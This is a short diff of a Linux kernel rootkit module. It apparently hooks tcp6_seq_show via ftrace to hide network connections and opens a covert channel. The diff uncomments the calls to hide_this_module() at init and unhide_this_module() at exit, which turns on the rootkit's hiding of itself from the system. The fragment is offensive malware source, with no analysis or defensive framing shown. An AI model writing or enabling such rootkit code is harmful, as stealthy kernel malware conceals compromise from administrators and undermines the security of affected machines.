@@ -84,7 +84,7 @@ struct ftrace_hook tcp6_hook = HOOK("tcp6_seq_show", new_tcp6_seq_show, &orig_tc
 
 static int __init rootkit_init(void) {
     // hiding the module
-//    hide_this_module();
+    hide_this_module();
 
     setup_my_channel();
 
@@ -127,7 +127,7 @@ void exit_my_module(void) {
     close_my_channel();
 
     // unhide the module
-//    unhide_this_module();
+    unhide_this_module();
 }
 
 static void __exit rootkit_exit(void) {
